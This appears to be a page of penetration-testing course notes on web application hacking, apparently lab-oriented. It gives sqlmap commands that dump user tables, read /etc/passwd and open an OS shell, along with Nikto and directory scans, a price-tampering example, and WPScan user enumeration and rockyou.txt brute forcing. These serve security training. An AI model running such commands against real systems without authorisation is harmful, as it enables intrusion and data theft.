---
layout: default
title: Domain 3 - Web Server & Application Hacking
parent: Domains
nav_order: 3
description: "SQL injection, web directory enumeration, parameter tampering, and WordPress exploitation."
has_children: true
---

# Domain 3: Web Server & Application Hacking

## Overview

Web applications are common targets. SQL injection, directory traversal, and parameter tampering allow attackers to bypass authentication and steal data.

**Key Topics:**
- SQL injection with SQLMAP
- Web directory enumeration (Nikto, Robuster)
- DVWA vulnerable application
- Parameter tampering
- WordPress exploitation
- File upload vulnerabilities
- Authentication bypass

**Duration:** 15-25 minutes per task  
**Difficulty:** Medium  
**Tools:** SQLMAP, Nikto, Robuster, Burp Suite, WPScan, Curl

---

## 3.1 SQL Injection with SQLMAP

```bash
# Basic SQL injection test
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs

# POST data
sqlmap -u "http://192.168.1.5/login.php" --data "user=admin&pass=test" --dbs

# Enumerate tables
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump

# Read files from server
sqlmap -u "http://192.168.1.5/page.php?id=1" --file-read="/etc/passwd"

# OS shell
sqlmap -u "http://192.168.1.5/page.php?id=1" --os-shell
```

---

## 3.2 Web Directory Enumeration

### Nikto

```bash
nikto -h http://192.168.1.5
nikto -h 192.168.1.5 -p 8080
nikto -h http://192.168.1.5 -o report.txt
```

### Robuster

```bash
robuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/common.txt
robuster dir -u http://192.168.1.5 -w wordlist.txt
```

---

## 3.3 Parameter Tampering

Use Burp Suite to:
1. Enable proxy capture
2. Intercept request
3. Modify parameters
4. Forward to observe effect

Example:
```
Original: http://site.com/purchase.php?item=shirt&price=10
Modified: http://site.com/purchase.php?item=shirt&price=1
```

---

## 3.4 WordPress Scanning

```bash
wpscan --url http://target.com --enumerate u              # Users
wpscan --url http://target.com --enumerate p              # Plugins
wpscan --url http://target.com --enumerate t              # Themes
wpscan --url http://target.com --enumerate all            # All
wpscan --url http://target.com -U admin -P rockyou.txt    # Brute force
```

---

## See Also

- **[Challenges](challenges.html)**
- **[Domain 1: Network Scanning](../domain-1-network-scanning/)**
- **[Domain 4: Cryptography](../domain-4-cryptography/)**

---

**Next Step:** Practice [challenges.md](challenges.html)
